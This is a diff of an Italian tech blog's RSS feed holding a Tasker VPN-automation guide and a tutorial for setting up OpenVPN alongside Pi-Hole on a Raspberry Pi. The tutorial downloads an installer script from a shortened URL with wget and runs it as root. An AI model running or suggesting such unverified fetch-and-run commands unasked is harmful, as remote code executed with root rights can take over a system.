+&lt;p>Ora torniamo indietro fino al pannello principale delle attività.&lt;/p>
+&lt;h3 id="stop-vpn">
+Stop VPN
+&lt;a href="#stop-vpn" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Creiamo la seconda attività per disconnettere la VPN sempre seguendo la stessa procedura con &lt;strong>+&lt;/strong>, scriviamo &lt;strong>&amp;ldquo;Stop VPN&amp;rdquo;&lt;/strong> e confermiamo.&lt;/p>
+&lt;p>Di nuovo qui facciamo &lt;strong>+&lt;/strong>, &lt;strong>Sistema&lt;/strong>, &lt;strong>Invia Intent&lt;/strong> e scriviamo questi parametri:&lt;/p>
+&lt;p>Azione&lt;br>
+&lt;code>android.intent.action.MAIN&lt;/code>&lt;br>
+Cat&lt;br>
+&lt;code>None&lt;/code>&lt;br>
+Extra (dove &amp;ldquo;Casa&amp;rdquo; è il nome del vostro profilo VPN)&lt;br>
+&lt;code>de.blinkt.openvpn.shortcutProfileName: Casa&lt;/code>&lt;br>
+Pacchetto&lt;br>
+&lt;code>de.blinkt.openvpn&lt;/code>&lt;br>
+Classe&lt;br>
+&lt;code>de.blinkt.openvpn.api.DisconnectVPN&lt;/code>&lt;br>
+Target&lt;br>
+&lt;code>Activity&lt;/code>&lt;/p>
+&lt;p>Torniamo di nuovo indietro alla home e se avete fatto tutto giusto, dovreste ritrovarvi con due Attività: &lt;strong>&amp;ldquo;Start VPN&amp;rdquo;&lt;/strong> e &lt;strong>&amp;ldquo;Stop VPN&amp;rdquo;&lt;/strong>.&lt;/p>
+&lt;h2 id="creazione-dei-profili-wifi-collegato-e-non-wifi-collegato">
+Creazione dei profili &amp;ldquo;WIFI Collegato&amp;rdquo; e &amp;ldquo;Non WIFI Collegato&amp;rdquo;
+&lt;a href="#creazione-dei-profili-wifi-collegato-e-non-wifi-collegato" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Ora possiamo passare alla creazione dei profili.&lt;/p>
+&lt;h3 id="wifi-collegato">
+WIFI Collegato
+&lt;a href="#wifi-collegato" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Iniziamo con la creazione del profilo &lt;strong>&amp;ldquo;WIFI Collegato&amp;rdquo;&lt;/strong>, dobbiamo quindi dirgli di disconnettere la VPN se siamo connessi al nostro WiFi di casa.&lt;/p>
+&lt;p>Spostiamoci nella tab &lt;strong>Profili&lt;/strong>, premiamo &lt;strong>+&lt;/strong>, selezioniamo &lt;strong>Stato&lt;/strong> dal menu a scomparsa, poi &lt;strong>Rete&lt;/strong> e &lt;strong>WIFI Collegato&lt;/strong>.&lt;/p>
+&lt;p>Nel form che vi compare, dovete semplicemente inserire il &lt;strong>nome della vostra rete WiFi&lt;/strong> nel campo &lt;strong>SSID&lt;/strong> e lasciare tutto il resto invariato. Ora premendo indietro per tornare alla pagina principale vi comparirà automaticamente un menu rapido dal quale possiamo scegliere l&amp;rsquo;azione da eseguire quando si attiverà questo profilo. In questo specifico caso dovete selezionare &lt;strong>&amp;ldquo;Stop VPN&amp;rdquo;&lt;/strong>.&lt;/p>
+&lt;p>Ed ecco quindi che abbiamo creato il primo profilo:&lt;/p>
+&lt;p>&lt;strong>SE&lt;/strong> [WiFi di casa connesso] &lt;strong>È VERO, ALLORA&lt;/strong> [Disconnetti VPN]&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/Screenshot_20181125-161151-2.png" />
+&lt;/figure>
+&lt;h3 id="non-wifi-collegato">
+Non WIFI Collegato
+&lt;a href="#non-wifi-collegato" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Passiamo quindi alla creazione del profilo &lt;strong>&amp;ldquo;Non WIFI Collegato&amp;rdquo;&lt;/strong>. Dobbiamo dire che se il WiFi viene scollegato, deve connettersi automaticamente la VPN.&lt;/p>
+&lt;p>Procediamo quindi allo stesso modo nella tab &lt;strong>Profili&lt;/strong>, premiamo &lt;strong>+&lt;/strong>, selezioniamo &lt;strong>Stato&lt;/strong> dal menu a scomparsa, poi &lt;strong>Rete&lt;/strong> e &lt;strong>WIFI Collegato&lt;/strong>. A questo punto dobbiamo semplicemente mettere la spunta su &lt;strong>Inverti&lt;/strong> lasciando tutto vuoto.&lt;/p>
+&lt;p>Torniamo indietro e ci verrà riproposto lo stesso menu rapido di prima, dove selezioniamo &lt;strong>&amp;ldquo;Start VPN&amp;rdquo;&lt;/strong>.&lt;/p>
+&lt;p>Facendo così, abbiamo creato anche il nostro secondo profilo:&lt;/p>
+&lt;p>&lt;strong>SE&lt;/strong> [WiFi non connesso] &lt;strong>È VERO, ALLORA&lt;/strong> [Connetti VPN]&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/Screenshot_20181125-161157-2.png" />
+&lt;/figure>
+&lt;h2 id="salvataggio-della-configurazione">
+Salvataggio della configurazione
+&lt;a href="#salvataggio-della-configurazione" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Ora che abbiamo creato le azioni e i profili, non resta che salvare tutta la configurazione. Per farlo è sufficiente premere il &lt;strong>check&lt;/strong> sulla barra del titolo e Tasker si attiverà.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/Screenshot_20181125-162303.png" />
+&lt;/figure>
+&lt;h2 id="autorizzare-tasker-per-linterazione-con-openvpn">
+Autorizzare Tasker per l&amp;rsquo;interazione con OpenVPN
+&lt;a href="#autorizzare-tasker-per-linterazione-con-openvpn" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Alla prima esecuzione di un&amp;rsquo;attività potrebbe apparirvi un popup di richiesta autorizzazione. Questo è un avviso di sicurezza di &lt;strong>OpenVPN per Android&lt;/strong> per indicarvi che un&amp;rsquo;applicazione di terze parti vuole interagire con i profili VPN. Qui dovete semplicemente &lt;strong>mettere la spunta&lt;/strong> per considerare Tasker attendibile e fare &lt;strong>Ok&lt;/strong>.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/Screenshot_20181125-170252-2.png" />
+&lt;/figure>
+&lt;h2 id="considerazioni-finali">
+Considerazioni finali
+&lt;a href="#considerazioni-finali" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Sto utilizzando questa configurazione da circa un mesetto e posso confermarvi che il setup è abbastanza solido. So per certo però che i più attenti di voi non potranno fare a meno di notare che c&amp;rsquo;è un piccolo &amp;ldquo;bug&amp;rdquo; nella mia configurazione, che si presenta nella situazione in cui si passa dalla rete WiFi di casa direttamente ad un&amp;rsquo;altra rete WiFi. In questo specifico caso infatti il profilo &amp;ldquo;Non WIFI Collegato&amp;rdquo; non entra in azione, poiché il dispositivo migra direttamente da una rete WiFi ad un&amp;rsquo;altra, non scatenando l&amp;rsquo;evento che fa switchare il profilo.&lt;/p>
+&lt;p>La situazione potrebbe sembrare di facile risoluzione semplicemente inserendo il nome dell&amp;rsquo;SSID di casa insieme al parametro Inverti (SE ![SSID di Casa]), tuttavia impostando così il profilo ho riscontrato che viene attivato erroneamente nel momento in cui il telefono si connette in VPN, generando così un loop di connessione e disconnessione continua.&lt;/p>
+&lt;p>Ammetto di non avere indagato a fondo, tuttavia il setup così impostato è perfetto per la mia esperienza d&amp;rsquo;uso, ovvero:&lt;/p>
+&lt;p>&lt;strong>Sono a casa -&amp;gt;&lt;/strong> Profilo &amp;ldquo;WiFi Collegato&amp;rdquo;, navigo in rete locale.&lt;/p>
+&lt;p>&lt;strong>Fuori casa in 4G -&amp;gt;&lt;/strong> Mi sgancio dal wifi, si attiva &amp;ldquo;Non WiFi Collegato&amp;rdquo; e navigo in VPN.&lt;/p>
+&lt;p>&lt;strong>Mi collego ad altri WiFi -&amp;gt;&lt;/strong> La condizione per &amp;ldquo;WiFi Collegato&amp;rdquo; non viene rispettata in quanto SSID differente, quindi continuo a navigare in VPN.&lt;/p>
+&lt;p>&lt;strong>Torno a casa -&amp;gt;&lt;/strong> Rileva connessione al WiFi domestico, entra &amp;ldquo;WiFi Collegato&amp;rdquo; che disconnette la VPN.&lt;/p>
+&lt;p>E con questo è tutto. Se avete bisogno di ulteriori informazioni, segnalarmi degli errori o fornirmi feedback, scrivetemi! ☺️&lt;/p></description></item><item><title>VPPN: Virtual Private "Pi-Holed" Network</title><link>/post/virtual-private-pi-holed-network/</link><pubDate>Fri, 02 Nov 2018 16:34:08 +0000</pubDate><guid>/post/virtual-private-pi-holed-network/</guid><description>
+&lt;img src="/images/pihole1-1.jpg"/>
+&lt;p>Chi mi conosce sa molto bene che provo un amore incondizionato per &lt;a href="https://pi-hole.net/">Pi-Hole&lt;/a>. Navigare in una rete non protetta da Pi-Hole mi fa sentire nudo e vulnerabile, perché Pi-Hole non è un semplice ad-blocker, è un incredibile strumento per alzare in modo considerevole la sicurezza della navigazione.&lt;/p>
+&lt;p>Senza gli ads, si riduce quasi del 100% la possibilità di venire dirottati su qualche pagina malevola a causa di malvertising.&lt;/p>
+&lt;p>Per esempio, attacchi di questo tipo verrebbero completamente neutralizzati grazie a Pi-Hole:&lt;/p>
+&lt;style type="text/css">
+.twitter-tweet {
+font: 14px/1.45 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;
+border-left: 4px solid #2b7bb9;
+padding-left: 1.5em;
+color: #555;
+}
+.twitter-tweet a {
+color: #2b7bb9;
+text-decoration: none;
+}
+blockquote.twitter-tweet a:hover,
+blockquote.twitter-tweet a:focus {
+text-decoration: underline;
+}
+&lt;/style>
+&lt;blockquote class="twitter-tweet" data-dnt="true">&lt;p lang="en" dir="ltr">Brand new Win10 laptop. Attempt to install Chrome. Almost get owned with my very first action. Why is this still happening in 2018, &lt;a href="https://twitter.com/bing?ref_src=twsrc%5Etfw">@bing&lt;/a>? Please explain. &lt;a href="https://t.co/uYJhu7xa9H">pic.twitter.com/uYJhu7xa9H&lt;/a>&lt;/p>&amp;mdash; Gabriel Landau (@GabrielLandau) &lt;a href="https://twitter.com/GabrielLandau/status/1055300918101598208?ref_src=twsrc%5Etfw">October 25, 2018&lt;/a>&lt;/blockquote>
+&lt;p>Fin dai primi giorni di utilizzo ho desiderato poter avere lo stesso livello di protezione anche in mobilità con lo smartphone. L&amp;rsquo;idea era quella di fare una VPN per dirottare tutto il traffico di navigazione nella rete di casa e far gestire quindi i DNS da Pi-Hole. Purtroppo questa idea è durata qualche secondo, giusto il tempo di ricordarsi di avere una misera aDSL da 8Mbps/700Kbps. #FuckDigitalDivideNon potendo fare una VPN domestica a causa delle scarse prestazioni della mia rete, ho adottato per diverso tempo una VPN di terze parti, nello specifico F-Secure Freedome, che implementa un filtro per siti malevoli e tracking. Non siamo ai livelli di Pi-Hole, però mi ha aiutato a navigare in modo sicuro anche in mobilità negli ultimi due anni.&lt;/p>
+&lt;p>Ora però la musica è cambiata. Ora ho cambiato casa e ho finalmente a disposizione una connessione stratosferica, 1Gbps/200Mbps con OpenFiber!&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/asdasdasdasda.gif" />
+&lt;/figure>
+&lt;p>Appena ho collegato il router e ho provato con mano l&amp;rsquo;incredibile velocità, l&amp;rsquo;idea della VPN è tornata a solleticarmi, così una sera mi sono messo comodo sul divano e ho realizzato la mia &lt;strong>Virtual Private Pi-Holed Network&lt;/strong>!&lt;/p>
+&lt;p>Nota: esiste una &lt;a href="https://docs.pi-hole.net/guides/vpn/overview/">guida ufficiale molto ben dettagliata&lt;/a>, da cui ho preso informazioni a piene mani, tuttavia parte da una Raspbian pulita senza nulla, ci installa prima OpenVPN e poi Pi-Hole. E&amp;rsquo; molto più facile invece trovarsi in una situazione dove si ha un RPi con Pi-Hole già installato e configurato e si desidera installarci sopra la VPN.&lt;/p>
+&lt;p>Ed è esattamente quello che faremo ora.&lt;/p>
+&lt;p>Situazione di partenza: Raspberry Pi nella rete locale con Raspbian Lite e Pi-Hole installato e funzionante. Darò per scontato che se siete arrivati qui, sapete connettervi in SSH al vostro RPi. Consiglio prima di partire con l&amp;rsquo;installazione, di fare un controllo su eventuali aggiornamenti disponibili:&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo apt update &amp;amp;&amp;amp; sudo apt upgrade
+&lt;/code>&lt;/pre>&lt;h3 id="installiamo-openvpn-su-pi-hole">
+Installiamo OpenVPN su Pi-Hole
+&lt;a href="#installiamo-openvpn-su-pi-hole" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>La prima cosa da fare è scaricare e installare OpenVPN &lt;a href="https://en.wikipedia.org/wiki/Road_warrior_(computing)">road warrior&lt;/a>. Connettetevi in SSH al RPi ed eseguite questo comando:&lt;/p>
+&lt;pre tabindex="0">&lt;code>wget https://git.io/vpn -O openvpn-install.sh
 chmod 755 openvpn-install.sh
 sudo ./openvpn-install.sh
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Verrà eseguita la procedura guidata per l&amp;rsquo;installazione. E&amp;rsquo; molto semplice e basta inserire poche informazioni chiave. Vi consiglio di tenere le stesse impostazioni che ho messo io e cambiare solamente il vostro indirizzo pubblico e il nome del client alla fine:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to this quick OpenVPN &amp;#34;road warrior&amp;#34; installer
-
+&lt;/code>&lt;/pre>&lt;p>Verrà eseguita la procedura guidata per l&amp;rsquo;installazione. E&amp;rsquo; molto semplice e basta inserire poche informazioni chiave. Vi consiglio di tenere le stesse impostazioni che ho messo io e cambiare solamente il vostro indirizzo pubblico e il nome del client alla fine:&lt;/p>
+&lt;pre tabindex="0">&lt;code>Welcome to this quick OpenVPN &amp;#34;road warrior&amp;#34; installer
 I need to ask you a few questions before starting the setup
 You can leave the default options and just press enter if you are ok with them
-
 First I need to know the IPv4 address of the network interface you want OpenVPN
 listening to.
 IP address: 10.8.0.1
-
 This server is behind NAT. What is the public IPv4 address or hostname?
-Public IP address / hostname: x.x.x.x 
+Public IP address / hostname: x.x.x.x
 #Nota: qui dovete inserire il vostro IP pubblico di casa
-
 Which protocol do you want for OpenVPN connections?
-   1) UDP (recommended)
-   2) TCP
+1) UDP (recommended)
+2) TCP
 Protocol [1-2]: 1
-
 What port do you want OpenVPN listening to?
 Port: 1194
-
 Which DNS do you want to use with the VPN?
-   1) Current system resolvers
-   2) Google
-   3) OpenDNS
-   4) NTT
-   5) Hurricane Electric
-   6) Verisign
+1) Current system resolvers
+2) Google
+3) OpenDNS
+4) NTT
+5) Hurricane Electric
+6) Verisign
 DNS [1-6]: 1
-
 Finally, tell me your name for the client certificate
 Please, use one word only, no special characters
-Client name: GabrielePixel2 
+Client name: GabrielePixel2
 #Nota: qui dovete inserire un nome profilo per il vostro utente remoto
-
 Okay, that was all I needed. We are ready to setup your OpenVPN server now
 Press any key to continue...
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A questo punto partirà l&amp;rsquo;installazione e terminerà così:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Finished!
-
+&lt;/code>&lt;/pre>&lt;p>A questo punto partirà l&amp;rsquo;installazione e terminerà così:&lt;/p>
+&lt;pre tabindex="0">&lt;code>Finished!
 Your client configuration is available at /root/GabrielePixel2.ovpn
 If you want to add more clients, you simply need to run this script again!
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Il file che ha generato è il profilo &lt;code&gt;.ovpn&lt;/code&gt; da copiare nel vostro client per poter effettuare la connessione. Di default lo salva in &lt;code&gt;/root/&lt;/code&gt;, vi consiglio di spostarlo nella vostra home per poterlo prelevare dal RPi con più semplicità:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd ~
+&lt;/code>&lt;/pre>&lt;p>Il file che ha generato è il profilo &lt;code>.ovpn&lt;/code> da copiare nel vostro client per poter effettuare la connessione. Di default lo salva in &lt;code>/root/&lt;/code>, vi consiglio di spostarlo nella vostra home per poterlo prelevare dal RPi con più semplicità:&lt;/p>
+&lt;pre tabindex="0">&lt;code>cd ~
 sudo mv /root/GabrielePixel2.ovpn GabrielePixel2.ovpn
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A seconda della configurazione del vostro RPi, potrebbe essere necessario diventare proprietari del file per poterlo gestire. Se usate l&amp;rsquo;utente di default &lt;code&gt;pi&lt;/code&gt; basta digitare:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo chown pi:pi GabrielePixel2.ovpn
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Di questo file ci occuperemo più avanti. Procediamo con la configurazione del server VPN.&lt;/p&gt;
-&lt;h3 id=&#34;configuriamo-openvpn-server&#34;&gt;
-  Configuriamo OpenVPN Server
-  &lt;a href=&#34;#configuriamo-openvpn-server&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Ora dobbiamo cambiare i resolver DNS per l&amp;rsquo;interfaccia &lt;code&gt;tun0&lt;/code&gt; creata dallo script di OpenVPN. Prima però ci serve sapere l&amp;rsquo;IP di questa interfaccia. Se non avete cambiato nulla in fase di installazione rispetto alla guida, dovrebbe avere indirizzo &lt;code&gt;10.8.0.1&lt;/code&gt;, in alternativa potete sempre verificare con questi semplici comandi&lt;/p&gt;
-&lt;p&gt;Per Raspbian Jessie:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ifconfig tun0 | grep &amp;#39;inet addr&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Per Raspbian Stretch:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ip a
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Annotiamoci l&amp;rsquo;IP dell&amp;rsquo;interfaccia &lt;code&gt;tun0&lt;/code&gt;, quindi andiamo a modificare il file di configurazione di OpenVPN:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo nano /etc/openvpn/server.conf
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cercate all&amp;rsquo;interno del file la riga che inizia con &lt;code&gt;push &amp;quot;dhcp option DNS x.x.x.x&amp;quot;&lt;/code&gt; e modificatela con l&amp;rsquo;IP della vostra &lt;code&gt;tun0&lt;/code&gt;:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;push &amp;#34;dhcp-option DNS 10.8.0.1&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chiudete salvando il file e riavviate il servizio di OpenVPN:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo service openvpn restart
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ora colleghiamoci al pannello admin web di Pi-Hole, nelle impostazioni, sezione DNS, impostate l&amp;rsquo;interfaccia di ascolto su &amp;ldquo;Listen on all interfaces&amp;rdquo; e salvate:&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/Screenshot_2018-11-02-Pi-hole-Admin-Console.png&#34;   /&gt;
-    
-      &lt;figcaption class=&#34;center&#34; &gt;Listen on all interfaces&lt;/figcaption&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;A questo punto il server OpenVPN è configurato e funzionante con Pi-Hole come resolver DNS! 👏&lt;/p&gt;
-&lt;h3 id=&#34;port-forward-dal-router&#34;&gt;
-  Port Forward dal router
-  &lt;a href=&#34;#port-forward-dal-router&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Per poter accedere da fuori è necessario esporre su internet la porta 1194 UDP del vostro RPi. Non vi lascio una guida per farlo perché cambia a seconda del router che avete, però vi consiglio di fare molta attenzione ad esporre SOLAMENTE la porta 1194 UDP e non tutto il RPi. &lt;strong&gt;Non mettete il RPi in DMZ!!&lt;/strong&gt;&lt;/p&gt;
-&lt;h3 id=&#34;esportiamo-il-file-ovpn&#34;&gt;
-  Esportiamo il file .ovpn
-  &lt;a href=&#34;#esportiamo-il-file-ovpn&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Ora possiamo provare a connetterci alla nostra VPN, però prima dobbiamo recuperare il nostro file di configurazione &lt;code&gt;.ovpn&lt;/code&gt; dal RPi e copiarlo sullo smartphone. Per farlo è sufficiente connettersi con un client SFTP e prelevare dalla home directory il file. Se siete su Windows vi consiglio &lt;a href=&#34;https://winscp.net/eng/docs/lang:it&#34;&gt;WinSCP&lt;/a&gt;. Salvate pure il file &lt;code&gt;.ovpn&lt;/code&gt; dove volete nel vostro smartphone, non è importante.&lt;/p&gt;
-&lt;p&gt;Se volete, potete creare ulteriori nuovi utenti semplicemente eseguendo di nuovo lo script iniziale&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo ./openvpn-install.sh
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Questa volta apparirà un menu differente, dove potremo creare un nuovo profilo &lt;code&gt;.ovpn&lt;/code&gt; da usare per esempio su un altro device.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Looks like OpenVPN is already installed
-
+&lt;/code>&lt;/pre>&lt;p>A seconda della configurazione del vostro RPi, potrebbe essere necessario diventare proprietari del file per poterlo gestire. Se usate l&amp;rsquo;utente di default &lt;code>pi&lt;/code> basta digitare:&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo chown pi:pi GabrielePixel2.ovpn
+&lt;/code>&lt;/pre>&lt;p>Di questo file ci occuperemo più avanti. Procediamo con la configurazione del server VPN.&lt;/p>
+&lt;h3 id="configuriamo-openvpn-server">
+Configuriamo OpenVPN Server
+&lt;a href="#configuriamo-openvpn-server" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Ora dobbiamo cambiare i resolver DNS per l&amp;rsquo;interfaccia &lt;code>tun0&lt;/code> creata dallo script di OpenVPN. Prima però ci serve sapere l&amp;rsquo;IP di questa interfaccia. Se non avete cambiato nulla in fase di installazione rispetto alla guida, dovrebbe avere indirizzo &lt;code>10.8.0.1&lt;/code>, in alternativa potete sempre verificare con questi semplici comandi&lt;/p>
+&lt;p>Per Raspbian Jessie:&lt;/p>
+&lt;pre tabindex="0">&lt;code>ifconfig tun0 | grep &amp;#39;inet addr&amp;#39;
+&lt;/code>&lt;/pre>&lt;p>Per Raspbian Stretch:&lt;/p>
+&lt;pre tabindex="0">&lt;code>ip a
+&lt;/code>&lt;/pre>&lt;p>Annotiamoci l&amp;rsquo;IP dell&amp;rsquo;interfaccia &lt;code>tun0&lt;/code>, quindi andiamo a modificare il file di configurazione di OpenVPN:&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo nano /etc/openvpn/server.conf
+&lt;/code>&lt;/pre>&lt;p>Cercate all&amp;rsquo;interno del file la riga che inizia con &lt;code>push &amp;quot;dhcp option DNS x.x.x.x&amp;quot;&lt;/code> e modificatela con l&amp;rsquo;IP della vostra &lt;code>tun0&lt;/code>:&lt;/p>
+&lt;pre tabindex="0">&lt;code>push &amp;#34;dhcp-option DNS 10.8.0.1&amp;#34;
+&lt;/code>&lt;/pre>&lt;p>Chiudete salvando il file e riavviate il servizio di OpenVPN:&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo service openvpn restart
+&lt;/code>&lt;/pre>&lt;p>Ora colleghiamoci al pannello admin web di Pi-Hole, nelle impostazioni, sezione DNS, impostate l&amp;rsquo;interfaccia di ascolto su &amp;ldquo;Listen on all interfaces&amp;rdquo; e salvate:&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/Screenshot_2018-11-02-Pi-hole-Admin-Console.png" />
+&lt;figcaption class="center" >Listen on all interfaces&lt;/figcaption>
+&lt;/figure>
+&lt;p>A questo punto il server OpenVPN è configurato e funzionante con Pi-Hole come resolver DNS! 👏&lt;/p>
+&lt;h3 id="port-forward-dal-router">
+Port Forward dal router
+&lt;a href="#port-forward-dal-router" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Per poter accedere da fuori è necessario esporre su internet la porta 1194 UDP del vostro RPi. Non vi lascio una guida per farlo perché cambia a seconda del router che avete, però vi consiglio di fare molta attenzione ad esporre SOLAMENTE la porta 1194 UDP e non tutto il RPi. &lt;strong>Non mettete il RPi in DMZ!!&lt;/strong>&lt;/p>
+&lt;h3 id="esportiamo-il-file-ovpn">
+Esportiamo il file .ovpn
+&lt;a href="#esportiamo-il-file-ovpn" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Ora possiamo provare a connetterci alla nostra VPN, però prima dobbiamo recuperare il nostro file di configurazione &lt;code>.ovpn&lt;/code> dal RPi e copiarlo sullo smartphone. Per farlo è sufficiente connettersi con un client SFTP e prelevare dalla home directory il file. Se siete su Windows vi consiglio &lt;a href="https://winscp.net/eng/docs/lang:it">WinSCP&lt;/a>. Salvate pure il file &lt;code>.ovpn&lt;/code> dove volete nel vostro smartphone, non è importante.&lt;/p>
+&lt;p>Se volete, potete creare ulteriori nuovi utenti semplicemente eseguendo di nuovo lo script iniziale&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo ./openvpn-install.sh
+&lt;/code>&lt;/pre>&lt;p>Questa volta apparirà un menu differente, dove potremo creare un nuovo profilo &lt;code>.ovpn&lt;/code> da usare per esempio su un altro device.&lt;/p>
+&lt;pre tabindex="0">&lt;code>Looks like OpenVPN is already installed
 What do you want to do?
-   1) Add a new user
-   2) Revoke an existing user
-   3) Remove OpenVPN
-   4) Exit
+1) Add a new user
+2) Revoke an existing user
+3) Remove OpenVPN
+4) Exit
 Select an option [1-4]: 1
-
 Tell me a name for the client certificate
 Please, use one word only, no special characters
 Client name: iPhone7
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;La procedura per esportare il file .ovpn è la medesima riportata sopra.&lt;/p&gt;
-&lt;h3 id=&#34;connettiamoci-alla-vpn&#34;&gt;
-  Connettiamoci alla VPN
-  &lt;a href=&#34;#connettiamoci-alla-vpn&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Procediamo quindi all&amp;rsquo;installazione del client OpenVPN. Su Android vi consiglio OpenVPN for Android, poiché è un&amp;rsquo;alternativa OpenSource al client ufficiale e permette una personalizzazione più granulare.&lt;/p&gt;
-&lt;p&gt;Ora dovete solamente importare il profilo &lt;code&gt;.ovpn&lt;/code&gt; nell&amp;rsquo;app e provare a connettervi.&lt;/p&gt;
-&lt;p&gt;Nota: potete cambiare liberamente il nome della connessione. Per esempio io l&amp;rsquo;ho chiamata &lt;code&gt;Casa&lt;/code&gt;.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/Screenshot_20181102-153132.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Se tutto è stato fatto come da manuale, dovrebbe connettersi e dovreste riuscire a navigare.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/Screenshot--2-nov-2018-17_30_49-.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Come prova dell&amp;rsquo;effettiva navigazione con Pi-Hole, potete provare a visitare questo sito: &lt;a href=&#34;https://blockads.fivefilters.org/?pihole&#34;&gt;https://blockads.fivefilters.org/?pihole&lt;/a&gt;&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/Screenshot_2018-11-02-Block-Ads--1.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Se vi restituisce questo messaggio, potete farvi i complimenti, avete appena creato la vostra &lt;strong&gt;Virtual Private Pi-Holed Network&lt;/strong&gt;!&lt;/p&gt;
-&lt;h3 id=&#34;heading&#34;&gt;
-  
-  &lt;a href=&#34;#heading&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>Perché DAZN consiglia Edge e Internet Explorer?</title>
-      <link>/post/perche-dazn-consiglia-edge/</link>
-      <pubDate>Sun, 26 Aug 2018 12:41:07 +0000</pubDate>
-      
-      <guid>/post/perche-dazn-consiglia-edge/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/dazn-og.jpg&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;L&amp;rsquo;altro giorno l&amp;rsquo;account ufficiale &lt;a href=&#34;https://twitter.com/DAZN_IT&#34;&gt;@DAZN_IT&lt;/a&gt; ha riportato una serie di consigli utili per migliorare la qualità dello streaming. Uno fra tutti, nello specifico il punto 4, ha fatto sbarellare tutti.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/2018-08-25-23_52_41-DAZN-Italia--@DAZN_IT--_-Twitter.png&#34;   /&gt;
-    
-      &lt;figcaption class=&#34;center&#34; &gt;Internet Explorer migliore di Chrome e Firefox? Questi sono pazzi.&lt;/figcaption&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Ennesimo consiglio da tabaccai? Beh&amp;hellip; in questo specifico caso, non proprio.&lt;/p&gt;
